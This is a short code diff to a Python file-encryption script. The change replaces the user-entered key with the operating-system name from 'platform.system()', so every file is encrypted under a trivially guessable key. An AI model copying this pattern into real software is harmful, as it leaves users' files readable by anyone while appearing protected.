@@ -1,5 +1,6 @@
 from product_cipher import *
 import os
+import platform
 
 
 # Main controller that gets input from the user and a list of files
@@ -7,7 +8,7 @@ import os
 def main():
 
     # Get the key and mode from the user
-    key = input('Input the key: ')
+    key = platform.system()
     mode = input('Select "encrypt" or "decrypt": ')
 
     # Specify the root directory and get a list of files
